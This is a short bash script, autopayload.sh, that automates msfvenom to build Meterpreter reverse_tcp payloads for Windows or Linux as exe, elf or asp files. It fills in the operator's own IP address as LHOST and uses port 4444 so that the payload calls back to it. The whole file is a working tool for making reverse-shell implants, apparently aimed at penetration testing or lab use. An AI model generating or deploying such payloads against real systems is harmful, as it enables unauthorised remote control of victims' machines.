#!/bin/bash

# Usage:
# ./autopayload.sh <os> <format> [arch]
# Example: ./autopayload.sh windows exe x64
# Defaults: arch = x86, LPORT = 4444, PAYLOAD = meterpreter

OS=$1         # windows / linux
FORMAT=$2     # exe / elf / asp / etc.
ARCH=${3:-x86} # default to x86 if not specified
LHOST=$(hostname -I | awk '{print $1}')
LPORT=4444

if [[ -z "$OS" || -z "$FORMAT" ]]; then
    echo "Usage: $0 <os: windows/linux> <format: exe/elf/asp> [arch: x86/x64]"
    exit 1
fi

# Decide payload
if [[ "$OS" == "windows" ]]; then
    PAYLOAD="windows/$ARCH/meterpreter/reverse_tcp"
    OUTFILE="payload.$FORMAT"
elif [[ "$OS" == "linux" ]]; then
    PAYLOAD="linux/$ARCH/meterpreter/reverse_tcp"
    OUTFILE="payload.$FORMAT"
else
    echo "[!] Unknown OS type: $OS"
    echo "Usage: ./autopayload.sh <windows|linux> <format> [x86|x64]"
    exit 1
fi

echo "[*] Generating payload..."
echo "    OS:      $OS"
echo "    Format:  $FORMAT"
echo "    Arch:    $ARCH"
echo "    Payload: $PAYLOAD"
echo "    LHOST:   $LHOST"
echo "    LPORT:   $LPORT"
echo

msfvenom -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT -f $FORMAT -o "$OUTFILE"

if [[ $? -eq 0 ]]; then
    echo "[+] Payload saved as: $OUTFILE"
else
    echo "[!] Failed to generate payload."
fi
